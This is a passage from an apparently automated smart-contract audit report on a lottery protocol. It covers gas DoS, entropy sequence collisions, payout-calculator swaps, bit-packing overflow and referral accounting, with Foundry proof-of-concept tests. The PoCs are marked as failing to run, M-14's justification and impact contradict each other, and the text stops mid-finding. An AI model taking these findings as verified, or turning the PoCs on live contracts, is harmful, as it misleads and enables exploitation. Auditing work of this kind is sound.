### Finding Severity Justification: The function getUserTickets performs an unbounded loop and allocates a memory array sized by a monotonically increasing counter (totalTicketsOwned) that is never pruned. While this can make the call expensive, it is an external view function intended for off-chain reads and is not used by the protocol in any state-changing path. There is no direct or indirect asset risk or protocol liveness impact; potential gas griefing only affects third-party on-chain callers who choose to use this view during a transaction. Per Code4rena guidance, issues in unused/heavy view functions are capped at Low.
## Derived From Pattern/Invariant
Unbounded iteration in getUserTickets can gas-DoS on-chain callers

## Exploit Type
GasGriefBlockLimit

## Location
JackpotBridgeManager.getUserTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless





 **Derived From** : getLPValueBreakdown underflows on drawing 0 (currentDrawingId - 1)

## [L-7]. getLPValueBreakdown reverts at bootstrap (drawing 0) due to currentDrawingId - 1 underflow, DoS for LP valuation previews

### Finding Severity Justification: The issue causes a revert in a view function (getLPValueBreakdown) during the bootstrap phase (currentDrawingId == 0) due to currentDrawingId - 1 underflow. This leads to a functional DoS for LP valuation previews but does not risk funds or core protocol operation. Per Code4rena rubric, front-end/readability/view-related breakages are Low at best.
## Derived From Pattern/Invariant
getLPValueBreakdown underflows on drawing 0 (currentDrawingId - 1)

## Exploit Type
AccountingInvariantViolation

## Location
JackpotLPManager.getLPValueBreakdown

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless





 **Derived From** : forall no-replacement sets: samples <= (maxRange - minRange + 1)

## [L-8]. Entropy callback DoS via unchecked no-replacement sample bound in ScaledEntropyProvider._getScaledRandomness

### Finding Severity Justification: The missing no-replacement bound check (samples <= range size) can cause the entropy callback to revert if a consumer submits an invalid SetRequest. This results in functional DoS for that request (the consumer never receives randomness). However, in the Megapot context, only the trusted Jackpot contract constructs these requests and it always uses samples=5 with range [1..normalBallMax], which is expected to be >= 5 by design. Thus, a stuck drawing would require governance misconfiguration of normalBallMax (<5), which is a trusted-admin misuse and classed as QA/Low per Code4rena guidelines. The issue is a valid robustness gap in ScaledEntropyProvider but does not provide a realistic, permissionless attack vector against the protocol under correct configuration.
## Derived From Pattern/Invariant
forall no-replacement sets: samples <= (maxRange - minRange + 1)

## Exploit Type
IntegerMath

## Location
ScaledEntropyProvider._getScaledRandomness

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Jackpot.sol isn’t included here to verify explicit guardrails (e.g., enforcing normalBallMax >= 5). The documentation and invariants strongly imply such constraints, but without the concrete setter checks, there is slight uncertainty. Even so, the impact still requires trusted-admin misconfiguration.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless




 **Derived From** : Referral distribution rounding dust accumulates and is never credited

## [L-9]. Unassigned remainder in Jackpot referral splitting accumulates as untracked USDC (penny-shaving over time)

### Finding Severity Justification: The code splits referral amounts using integer division and does not reassign the per-referrer rounding remainder, creating tiny dust per purchase/claim (at most < maxReferrers micro-USDC per operation). This does not risk assets or solvency and matches the project’s stated tolerance for rounding dust; impact is negligible and limited to sub-cent amounts accumulating over time.
## Derived From Pattern/Invariant
Referral distribution rounding dust accumulates and is never credited

## Exploit Type
RoundingError

## Location
Jackpot._validateAndTrackReferrals; _payReferrersWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless




 **Derived From** : Unbounded iteration over user-owned tickets can cause gas-based DoS for on-chain callers

## [L-10]. Unbounded loop with external call in JackpotTicketNFT.getUserTickets enables gas-based DoS against integrators

### Finding Severity Justification: The loop in JackpotTicketNFT.getUserTickets is unbounded and performs an external view call per iteration, which can exhaust gas for on-chain callers. However, it is a read-only helper not used in any protocol-critical path, does not risk assets or protocol solvency, and the DoS only materializes if an integrator chooses to call this unpaginated view on-chain. Per Code4rena guidelines, unbounded iteration in non-critical view helpers is QA/Low at best.
## Derived From Pattern/Invariant
Unbounded iteration over user-owned tickets can cause gas-based DoS for on-chain callers

## Exploit Type
GasGriefBlockLimit

## Location
JackpotTicketNFT.getUserTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless





 **Derived From** : Provider change can corrupt pending randomness due to per-provider sequence collisions

## [M-11]. Provider switch reuses sequence IDs across providers, overwriting pending[sequence] → wrong callback delivery and DoS (UnknownSequence) in ScaledEntropyProvider.setEntropyProvider

### Finding Severity Justification: Switching entropy providers while there is an outstanding request can cause sequence ID collisions because ScaledEntropyProvider keys pending requests only by sequence, not by (provider, sequence). This enables overwriting of a pending entry, misrouting the randomness to the wrong consumer and causing UnknownSequence() on the legitimate callback. Impact: protocol liveness and correctness of randomness delivery are compromised and can force emergency mode. No direct asset theft, but availability and integrity are affected.
## Derived From Pattern/Invariant
Provider change can corrupt pending randomness due to per-provider sequence collisions

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider.setEntropyProvider

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
IEntropyV2 sequence numbers are per-provider, but ScaledEntropyProvider keys pending requests only by sequence and ignores the provider everywhere, including in entropyCallback. If the owner calls setEntropyProvider while there are pending requests, the new provider may assign the same sequence as an old pending one. _storePendingRequest then overwrites pending[sequence] with the new caller’s data. When the old provider reveals, entropyCallback reads the overwritten entry and delivers randomness to the wrong callback; later the new provider’s reveal reverts with UnknownSequence(). This violates sequence-domain monotonicity and breaks liveness/correctness without any misuse by the admin.

Vulnerable snippets:
- mapping(uint64 => PendingRequest) private pending;
- function setEntropyProvider(address _entropyProvider) external onlyOwner { ... entropyProvider = _entropyProvider; }
- function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; if (req.callback == address(0)) revert UnknownSequence(); delete pending[sequence]; ... }
- function requestAndCallbackScaledRandomness(...) { sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit); _storePendingRequest(sequence, ...); }

## Impact
Switching the entropy provider while there are pending requests can corrupt pending mappings because they are keyed only by sequence. Since sequence numbers are per-provider in IEntropyV2, the next request after a provider switch may reuse a sequence already in use by the old provider. The new request overwrites pending[sequence], so when the old provider fulfills, the callback is executed with the wrong stored data (potentially wrong consumer or wrong context/requests). When the new provider later fulfills the same sequence, the contract reverts with UnknownSequence(), breaking liveness. Even if there is only a single consumer (e.g., Jackpot), the overwrite still causes the old fulfillment to consume the new request’s storage and parameters, and the new fulfillment then reverts, leaving the system stuck and wasting paid entropy fees. This undermines correctness and availability without direct asset theft.

## Command to Run Test


## Proof of Concept
Omitted

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockEntropy {
    struct Req { address consumer; address provider; uint32 gasLimit; }
    mapping(address => uint64) public seq;
    mapping(address => mapping(uint64 => Req)) public reqs;

    function getFeeV2(address, uint32) external pure returns (uint128) { return 0; }

    function requestV2(address provider, uint32 gasLimit) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = ++seq[provider];
        reqs[provider][assignedSequenceNumber] = Req({consumer: msg.sender, provider: provider, gasLimit: gasLimit});
    }

    // Reveal that requires callback success (use for the first fulfill)
    function reveal(address provider, uint64 sequence, bytes32 randomNumber) external {
        Req memory r = reqs[provider][sequence];
        require(r.consumer != address(0), "no request");
        (bool ok, ) = r.consumer.call(abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", sequence, provider, randomNumber));
        require(ok, "callback failed");
    }

    // Reveal that bubbles the consumer revert so tests can match the exact error
    function revealBubble(address provider, uint64 sequence, bytes32 randomNumber) external {
        Req memory r = reqs[provider][sequence];
        require(r.consumer != address(0), "no request");
        (bool ok, bytes memory ret) = r.consumer.call(abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", sequence, provider, randomNumber));
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }
}

contract DummyConsumer {
    bool public called;
    uint64 public calledSeq;
    address public caller;

    function makeRequest(ScaledEntropyProvider sep, uint32 gasLimit) external returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 1, withReplacement: true});
        return sep.requestAndCallbackScaledRandomness(gasLimit, reqs, this.onRandom.selector, bytes(""));
    }

    function onRandom(uint64 sequence, uint256[][] memory, bytes memory) external {
        called = true;
        calledSeq = sequence;
        caller = msg.sender;
    }
}

contract ScaledEntropyProvider_Monotonicity_Test is Test {
    ScaledEntropyProvider sep;
    MockEntropy entropy;
    DummyConsumer c1;
    DummyConsumer c2;
    address providerA = address(0xA);
    address providerB = address(0xB);

    function setUp() public {
        entropy = new MockEntropy();
        sep = new ScaledEntropyProvider(address(entropy), providerA);
        c1 = new DummyConsumer();
        c2 = new DummyConsumer();
    }

    function testProviderSwitchSequenceCollision() public {
        // C1 requests with provider A -> seqA = 1
        vm.prank(address(c1));
        uint64 s1 = c1.makeRequest(sep, 100000);
        assertEq(s1, 1);

        // Switch to provider B (owner is this test contract)
        sep.setEntropyProvider(providerB);

        // C2 requests with provider B -> seqB = 1 (same sequence id)
        vm.prank(address(c2));
        uint64 s2 = c2.makeRequest(sep, 100000);
        assertEq(s2, 1);

        // Old provider A fulfills sequence 1 => pending[1] has been overwritten by C2; C2 gets called
        entropy.reveal(providerA, 1, bytes32(uint256(123)));
        assertTrue(c2.called(), "C2 not called");
        assertEq(c2.calledSeq(), 1, "C2 wrong seq");
        assertFalse(c1.called(), "C1 should not be called");

        // New provider B fulfills its sequence 1 => UnknownSequence revert (pending[1] was deleted by prior fulfill)
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.revealBubble(providerB, 1, bytes32(uint256(456)));
    }
}


## Suggested Mitigation
- Key pending requests by provider and sequence, e.g., mapping(address => mapping(uint64 => PendingRequest)) or mapping(bytes32 => PendingRequest) keyed by keccak256(abi.encode(provider, sequence)).
- Store and verify the provider with each request, and in entropyCallback use the provider argument to look up the pending entry; revert if it does not match.
- Optionally gate setEntropyProvider() while there are outstanding requests (track a pending count), or introduce an epoch and include it in the key (keccak256(abi.encode(epoch, provider, sequence))).
- If you retain any single-key storage writes, ensure you clear or replace arrays rather than appending over pre-existing storage to avoid stale data in setRequests.





 **Derived From** : Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

## [M-12]. Provider rotation overwrites pending[sequence], misroutes randomness and bricks prior request via UnknownSequence

### Finding Severity Justification: Rotating the entropy provider while a prior request is pending can overwrite pending[sequence] because requests are keyed only by sequence and the callback ignores the provider address. Since Pyth Entropy V2 sequence numbers are provider-local, this enables misrouting of the first callback and then bricking the second via UnknownSequence(). Impact is a realistic functional DoS: a drawing can be permanently stuck and entropy fees wasted, but there is no direct theft of funds. This fits Code4rena Medium: protocol availability and correctness are impaired without direct asset loss.
## Derived From Pattern/Invariant
Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider.entropyCallback

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
ScaledEntropyProvider keys pending requests only by sequence and ignores the provider argument on callback. Pyth Entropy V2 sequences are provider-local, so rotating to a new provider while old requests are still pending can collide on the same sequence. The later request overwrites pending[sequence]; when the earlier provider’s callback arrives first, entropyCallback() processes it using the overwritten setRequests/context and deletes pending[sequence]. The legitimate later callback for the new provider then reverts UnknownSequence(), permanently failing that request. Vulnerable snippets:
- mapping(uint64 => PendingRequest) private pending;
- function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; if (req.callback == address(0)) revert UnknownSequence(); delete pending[sequence]; ... }
- function setEntropyProvider(address _entropyProvider) external onlyOwner { ... entropyProvider = _entropyProvider; }

## Impact
Functional DoS and accounting mismatch: one of two in-flight entropy requests is lost (permanent UnknownSequence), and the other may be delivered using the wrong setRequests/context. This can lock a drawing, burn entropy fees without result, and break the 1:1 request→callback invariant.

## Command to Run Test


## Proof of Concept
1) Deploy ScaledEntropyProvider with provider A; make request #1 (sequence=1 for A).
2) Owner rotates to provider B; make request #2 (sequence=1 for B) which overwrites pending[1].
3) Entropy callback for provider A, seq=1 arrives first → processed with request #2’s setRequests/context; pending[1] deleted.
4) Entropy callback for provider B, seq=1 arrives later → reverts UnknownSequence(). Result: request #1 is misrouted; request #2 is bricked; one drawing can be stuck.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockEntropy {
    mapping(address => uint64) public seq;
    function requestV2(address provider, uint32 /*gasLimit*/) external payable returns (uint64 assignedSequenceNumber) {
        uint64 s = seq[provider] + 1;
        seq[provider] = s;
        return s; // provider-local sequence starting at 1
    }
    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 0; // free for test
    }
}

contract MockConsumer {
    ScaledEntropyProvider public provider;
    uint64 public lastSequence;
    bytes public lastContext;
    uint256 public deliveredCount;

    constructor(ScaledEntropyProvider _provider) { provider = _provider; }

    function req(uint32 gasLimit, IScaledEntropyProvider.SetRequest[] memory requests, bytes memory ctx) external returns (uint64) {
        return provider.requestAndCallbackScaledRandomness(gasLimit, requests, this.onRandom.selector, ctx);
    }

    function onRandom(uint64 sequence, uint256[][] memory /*nums*/, bytes memory ctx) external {
        lastSequence = sequence;
        lastContext = ctx;
        deliveredCount++;
    }
}

contract ProviderRotationSequenceCollisionTest is Test {
    ScaledEntropyProvider sp;
    MockEntropy entropy;
    MockConsumer consumer;
    address providerA = address(0xA11CE);
    address providerB = address(0xB0B);

    function setUp() public {
        entropy = new MockEntropy();
        sp = new ScaledEntropyProvider(address(entropy), providerA);
        consumer = new MockConsumer(sp);
    }

    function _mkReq(uint8 samples, uint256 minR, uint256 maxR, bool withRep) internal pure returns (IScaledEntropyProvider.SetRequest[] memory r) {
        r = new IScaledEntropyProvider.SetRequest[](1);
        r[0] = IScaledEntropyProvider.SetRequest({samples: samples, minRange: minR, maxRange: maxR, withReplacement: withRep});
    }

    function test_providerRotation_overwrite_misroute_and_brick() public {
        // Request #1 via provider A (sequence=1 for A)
        uint64 s1 = consumer.req(200_000, _mkReq(1, 1, 10, true), bytes("ctx1"));
        assertEq(s1, 1);

        // Rotate to provider B
        sp.setEntropyProvider(providerB);

        // Request #2 via provider B (sequence=1 for B) -> overwrites pending[1]
        uint64 s2 = consumer.req(200_000, _mkReq(1, 1, 20, true), bytes("ctx2"));
        assertEq(s2, 1);

        // Callback from provider A first: handled using overwritten entry (#2), then deletes pending[1]
        vm.prank(address(entropy));
        sp._entropyCallback(1, providerA, keccak256("rndA"));
        assertEq(consumer.deliveredCount(), 1);
        assertEq(consumer.lastSequence(), 1);
        assertEq(keccak256(consumer.lastContext()), keccak256(bytes("ctx2"))); // misrouted to ctx2

        // Later callback from provider B for the actual #2 -> reverts UnknownSequence()
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        vm.prank(address(entropy));
        sp._entropyCallback(1, providerB, keccak256("rndB"));
    }
}


## Suggested Mitigation
- Key pending requests by (provider, sequence) or store the provider inside PendingRequest and validate in entropyCallback that the passed provider matches the stored one.
- Alternatively, forbid provider rotation while any pending requests exist (track a counter) or maintain separate namespaces per provider and only clean up the matching entry.





 **Derived From** : Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

## [M-13]. GuaranteedMinimumPayoutCalculator can settle with uninitialized snapshot after mid-drawing swap, zeroing all tier payouts

### Finding Severity Justification: Swapping to a fresh payout calculator mid-drawing causes the current drawing to be settled against an uninitialized snapshot, resulting in all tier payouts being zero and winners receiving nothing. While this requires an owner action, the contract/docs state the change "affects future payout calculations," creating a realistic footgun where an owner following expected usage could inadvertently brick a drawing’s payouts. Per Code4rena caveat, accidental bricking via valid admin flow merits Medium.
## Derived From Pattern/Invariant
Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

## Exploit Type
UpgradeabilityInitializerSafety

## Location
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings() assumes drawingTierInfo[_drawingId] has been snapshotted via setDrawingTierInfo(). If Jackpot.owner switches payoutCalculator to a fresh instance mid-drawing, the new calculator has no snapshot for the active drawing. The function then reads a default-zero DrawingTierInfo and short-circuits every tier as if ineligible: tierInfo.minPayoutTiers[i] == false and tierInfo.premiumTierWeights[i] == 0, so it executes:

DrawingTierInfo storage tierInfo = drawingTierInfo[_drawingId];
...
if (!tierInfo.minPayoutTiers[i] && tierInfo.premiumTierWeights[i] == 0) {
    tierWinners[i] = 0;
    continue;
}

This yields tierWinners = 0 for all tiers, minimumPayoutAllocation = 0, and _calculateAndStoreTierPayouts() never stores payouts; totalPayout returns 0. As a result, all winners for that drawing receive 0 and getTierPayout(_drawingId, tierId) returns 0. No guard verifies the snapshot exists (e.g., that weight sum == PRECISE_UNIT).

## Impact
If the owner swaps to a fresh payout calculator mid‑drawing, the settlement for that drawing runs against an all‑zero snapshot on the new calculator. This results in tier payouts not being stored and total user winnings computed as 0. Practically, all winners for that drawing receive 0 and can never claim later since getTierPayout(drawingId, tierId) stays 0. In addition, Jackpot will treat userWinnings=0 at settlement, crediting the entire prize pool to LP value (and potentially charging protocol fees), misallocating funds away from winners.

## Command to Run Test


## Proof of Concept
1) Drawing N is active. Jackpot has already called oldCalc.setDrawingTierInfo(N) at new-drawing init time.
2) Owner calls Jackpot.setPayoutCalculator(newCalc) mid-drawing.
3) newCalc has no drawingTierInfo[N] snapshot. When Jackpot settles drawing N, it calls newCalc.calculateAndStoreDrawingUserWinnings(N,...).
4) Because tierInfo is all-zero, every tier is treated as having no eligible payout path; function returns totalPayout = 0 and stores no tier payouts.
5) Users claiming winnings for drawing N read getTierPayout(N, tierId) == 0, receiving nothing.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract PayoutCalcInitOrderTest is Test {
    address jackpot = address(0xA11CE);

    function _deployCalc() internal returns (GuaranteedMinimumPayoutCalculator) {
        bool[12] memory minTiers;
        minTiers[11] = true; // only jackpot tier has min payout eligibility
        uint256[12] memory weights;
        weights[11] = 1e18;  // all premium weight to jackpot tier
        return new GuaranteedMinimumPayoutCalculator(
            IJackpot(jackpot),
            1e6,    // minimumPayout = 1 USDC (6 decimals)
            0,      // premiumTierMinAllocation
            minTiers,
            weights
        );
    }

    function test_midDrawingSwapToFreshCalcZeroesPayouts() public {
        GuaranteedMinimumPayoutCalculator calc1 = _deployCalc();
        GuaranteedMinimumPayoutCalculator calc2 = _deployCalc(); // fresh calc with empty snapshot mapping

        uint256 drawingId = 1;
        // At drawing init, Jackpot would snapshot on the then-current calculator (calc1)
        vm.prank(jackpot);
        calc1.setDrawingTierInfo(drawingId);

        uint256 prizePool = 100e6; // 100 USDC
        uint8 normalMax = 10;
        uint8 bonusballMax = 10;

        uint256[] memory uniqueResult = new uint256[](12);
        uint256[] memory dupResult = new uint256[](12);
        uniqueResult[11] = 1; // one jackpot winner (5 normals + bonusball)

        // Sanity: with proper snapshot, full pool goes to the single jackpot winner
        vm.prank(jackpot);
        uint256 expected = calc1.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusballMax, uniqueResult, dupResult
        );
        assertEq(expected, prizePool, "snapshot calc pays full pool to single jackpot winner");

        // Simulate mid-drawing swap: Jackpot now calls into a fresh calculator without snapshot
        vm.prank(jackpot);
        uint256 zeroed = calc2.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusballMax, uniqueResult, dupResult
        );
        assertEq(zeroed, 0, "fresh calc without snapshot returns zero total payout");
        assertEq(calc2.getTierPayout(drawingId, 11), 0, "tier payout not stored -> winners rugged");
    }
}

## Suggested Mitigation
Best fix: bind each drawing to the calculator that took its snapshot and use that instance for settlement. For example:
- In Jackpot._setNewDrawingState(), after calling payoutCalculator.setDrawingTierInfo(currentDrawingId), store payoutCalculatorForDrawing[currentDrawingId] = payoutCalculator.
- In scaledEntropyCallback(), call payoutCalculatorForDrawing[currentDrawingId].calculateAndStoreDrawingUserWinnings(...) instead of the mutable payoutCalculator variable. Optionally, expose a view to read this mapping for transparency.
Operational guard: make setPayoutCalculator() schedule the change for the next drawing only (e.g., set nextPayoutCalculator, and switch current→next exclusively inside _setNewDrawingState()). Revert setPayoutCalculator() if a drawing is active (currentDrawingId initialized and not yet settled), to prevent mid‑drawing swaps.
Defensive check (optional): in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings(), assert a snapshot exists before computing by requiring sum(tierInfo.premiumTierWeights) == PRECISE_UNIT. This avoids silent zeroing, but should be combined with the above Jackpot changes; otherwise it could cause settlement to revert and stall progress.





 **Derived From** : Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

## [M-14]. Bit-packing overflow breaks JackpotTicketNFT.getExtendedTicketInfo: normals length != 5 and bonusball == 0 when normalBallMax + bonusball > 255

### Finding Severity Justification: If normalBallMax + bonusballMax >= 256, TicketComboTracker.insert packs the bonusball with `1 << (bonusball + normalMax)`, which silently becomes 0 for shifts >= 256, corrupting the packed ticket. Consequences: (a) unpackTicket will revert (array bounds during normals fill or underflow on bonusball calc), breaking JackpotTicketNFT.getExtendedTicketInfo and any consumer; (b) more critically, tier computation in claimWinnings misinterprets bonusball as 0 for both ticket and winning numbers, producing incorrect tier IDs and payouts across the drawing. Impact is high if triggered, but reaching the boundary generally requires very large parameters/prize pools; pool-cap logic mitigates typical cases but does not hard-enforce the 255-bit limit, so the issue remains possible.
## Derived From Pattern/Invariant
Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

## Exploit Type
AccountingInvariantViolation

## Location
JackpotTicketNFT.getExtendedTicketInfo

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Tickets are bit-packed as: normals in bits [1..ballMax], bonusball at bit (ballMax + bonusball). Packing uses `1 << (bonusball + normalMax)` (TicketComboTracker.insert), and unpacking uses `TicketComboTracker.unpackTicket(packed, ballMax)` which builds `normals` with length `popCount(packed) - 1` and derives `bonusball = fls(packed) - ballMax`. There is no guard that enforces `bonusball + normalBallMax <= 255`. When `normalBallMax + bonusball >= 256`, the pack operation `1 << (bonusball + normalBallMax)` becomes a left shift by >=256 and yields 0 in Solidity 0.8+, so the bonusball bit is silently dropped. Consequences: (1) `getExtendedTicketInfo()` returns `normals.length == 4` (popCount=5, minus 1) and `bonusball == 0`, violating the arithmetic invariant that extended info has exactly 5 normals and a positive bonusball; (2) tier computation later treats missing bonusball as a match (both ticket and winning have 0 after `>> (normalBallMax+1)`), causing incorrect tier IDs and mispayout/DoS risks. Root causes: (a) `_setNewDrawingState` computes `bonusballMax` without clamping to `255 - normalBallMax` and casts to `uint8` without bounds checks; (b) packing uses unchecked shifting; (c) unpack assumes exactly one bit above `ballMax` exists.

## Impact
If bonusballMax + normalBallMax exceeds 255, any code path that builds the packed bit for the bonusball (using 1 << (bonus + normalMax)) will revert due to checked uint8 addition overflow before the shift, causing denial of service. Practically: (a) Users can be prevented from buying otherwise “allowed” tickets (bonusball <= bonusballMax) because insert() reverts when bonus + normalMax > 255; (b) More critically, scaledEntropyCallback can permanently fail if the entropy provider returns a winning bonusball > 255 - normalMax, leaving the drawing locked and forcing emergency-mode unwinds. This is a systemic availability failure; it does not silently corrupt tickets.

## Command to Run Test


## Proof of Concept
Precondition: A drawing (or tracker) is configured such that normalBallMax + bonusballMax > 255 (e.g., normalBallMax = 200, bonusballMax = 100). Two effects:
1) Ticket purchase DoS: A buyer selecting a valid bonusball within [1..bonusballMax] that also satisfies bonusball > 255 - normalBallMax will trigger a revert in TicketComboTracker.insert() due to overflow in (bonus + normalMax) before shifting, aborting buyTickets().
2) Settlement DoS: During scaledEntropyCallback, if the winning bonusball sampled by the entropy provider is > 255 - normalBallMax, building the winningTicket will revert for the same reason, bricking the drawing (jackpotLock remains true).
This arises because there is no clamp on newDrawingState.bonusballMax relative to normalBallMax in _setNewDrawingState(), and no downstream guard in _validateAndStoreTickets() against bonusball > 255 - ballMax.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {TicketComboTracker} from "contracts/lib/TicketComboTracker.sol";

contract BitFitGuardsTest is Test {
    TicketComboTracker.Tracker tracker;

    function setUp() public {
        // Configure a tracker with params that violate 255-bit packing headroom
        // normalMax + bonusballMax = 200 + 100 = 300 > 255
        TicketComboTracker.init(tracker, 200, 100, 5);
    }

    function test_insertRevertsWhenNormalPlusBonusExceeds255() public {
        uint8[] memory normals = new uint8[](5);
        normals[0] = 1; normals[1] = 2; normals[2] = 3; normals[3] = 4; normals[4] = 5;
        // bonusball within configured bonusballMax, but 200 + 60 = 260 > 255
        uint8 badBonus = 60;
        vm.expectRevert(); // uint8 addition overflow before shift
        TicketComboTracker.insert(tracker, normals, badBonus);
    }
}


## Suggested Mitigation
- Enforce bit-fit at drawing initialization: in _setNewDrawingState, clamp or revert so that newBonusball <= 255 - normalBallMax, e.g.:
  require(uint256(normalBallMax) + uint256(newBonusball) <= 255, "bonusballMax too large for packing");
  newBonusball = uint8(Math.min(newBonusball, 255 - normalBallMax));
- Harden purchase path: in _validateAndStoreTickets, require ticket.bonusball <= 255 - _currentDrawingState.ballMax in addition to existing range checks.
- Defensive decode: optionally add a sanity check in TicketComboTracker.unpackTicket to ensure fls(_packedTicket) > _normalMax and revert otherwise (fail fast on corrupted inputs).
- Governance guardrails: constrain setNormalBallMax to sane bounds (e.g., <= 128 to align with Combinations.choose constraints) and document that bonusballMin must also respect the 255-bit headroom.





 **Derived From** : No-referral winnings credited to current round lpEarnings skews accounting across rounds

## [M-15]. claimWinnings time-shifts “no-referral” referrerShare into arbitrary future round lpEarnings, inflating fees and breaking per-round accounting

### Finding Severity Justification: Referrer share from a winning ticket with no referral is credited to the current round’s lpEarnings at claim time, not to the original winning drawing. This lets claimants time claims to inflate a later round’s (lpEarnings − userWinnings), potentially triggering higher protocol fees and perturbing per-round accounting. Impact targets LP value and protocol fee extraction (not direct theft), fitting Medium per Code4rena: protocol function/value impacted with external conditions (claim timing).
## Derived From Pattern/Invariant
No-referral winnings credited to current round lpEarnings skews accounting across rounds

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._payReferrersWinnings

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Root cause: Jackpot._payReferrersWinnings credits the referrerShare of a winning ticket without a referral scheme to the current drawing’s lpEarnings instead of the drawing where the ticket won. Code: if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; }. Because claimWinnings only requires ticket.drawingId < currentDrawingId, a winner can wait and claim in any later round. This shifts revenue that belongs to drawingId into an arbitrary future drawing, violating per-round conservation/binding and inflating (lpEarnings − userWinnings) for the future round, potentially triggering _transferProtocolFee() to charge protocol fees on unrelated funds. It also perturbs next-round parameterization that depends on lpEarnings.
Vulnerable snippet:
function _payReferrersWinnings(bytes32 _referralSchemeId, uint256 _winningAmount, uint256 _referralWinShare) internal returns (uint256) {
    uint256 referrerShare = _winningAmount * _referralWinShare / PRECISE_UNIT;
    if (_referralSchemeId == bytes32(0)) {
        drawingState[currentDrawingId].lpEarnings += referrerShare; // wrong drawing and fee base
        emit LpEarningsUpdated(currentDrawingId, referrerShare);
        return referrerShare;
    }
    ...
}
Combined with claimWinnings allowing late claims across rounds:
if (drawingId >= currentDrawingId) revert JackpotErrors.TicketFromFutureDrawing(); // only needs < currentDrawingId

## Impact
Because no-referral referrerShare is booked into the claim-time round’s lpEarnings, a claimant can shift that amount into any later round. This distorts per-round accounting and lets a claimant strategically inflate (lpEarnings − userWinnings) of a chosen future round to trigger or increase protocol fees, extracting value from LPs. Conversely, claimants could also choose rounds where the inflated base is neutralized by large userWinnings, avoiding fees that would otherwise have been charged. The attacker does not gain funds directly but can grief LPs and perturb fee collection and round parameterization, constituting a Medium-severity economic/accounting manipulation.

## Command to Run Test


## Proof of Concept
Scenario:
1) A user buys a ticket in drawing #1 with no referral scheme. The ticket wins.
